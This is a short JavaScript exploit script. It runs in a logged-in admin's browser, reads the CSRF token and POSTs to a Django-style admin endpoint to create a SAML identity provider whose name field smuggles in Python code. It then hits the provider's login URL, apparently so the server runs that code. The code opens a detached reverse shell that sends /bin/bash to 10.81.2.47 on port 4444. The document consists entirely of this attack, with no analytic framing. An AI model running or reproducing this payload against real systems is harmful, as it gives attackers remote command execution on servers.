(function() {
     function getCookie(n){let b=document.cookie.match('(^|;)\\s*'+n+'\\s*=\\s*([^;]+)');return b?b.pop():''}
     const id = Math.floor(Math.random() * 9999);
     const slug = 'shell-' + id;
     const ip = "10.81.2.47";
     // This payload uses subprocess.Popen to create a completely detached process
     const py = `import subprocess;subprocess.Popen(['python3','-c','import socket,os,pty;s=socket.socket();s.connect(("${ip}",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'],start_new_session=True)`;
     const name = `Shell${id}\n${py}`;
       const formData = new FormData();
       formData.append('csrfmiddlewaretoken', getCookie('csrftoken'));
       formData.append('name', name);
       formData.append('slug', slug);
       formData.append('protocol', 'saml');
       formData.append('status', 'active');
       formData.append('priority', '0');
       formData.append('use_custom_attribute_map', 'on');
       formData.append('attribute_mapping', '{"email":["mail"]}');
       formData.append('saml_metadata_xml', `<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://x.com"><md:IDPSSODescriptor
   protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
   Location="https://x.com/sso"/></md:IDPSSODescriptor></md:EntityDescriptor>`);
       formData.append('_save', 'Save');
  
       console.log("Triggering detached shell...");
       fetch('/admin/uac/identityprovider/add/', { method: 'POST', body: formData })
       .then(r => {
           setTimeout(() => { fetch('/saml2/login/' + slug + '/'); }, 500);
       });
   })();
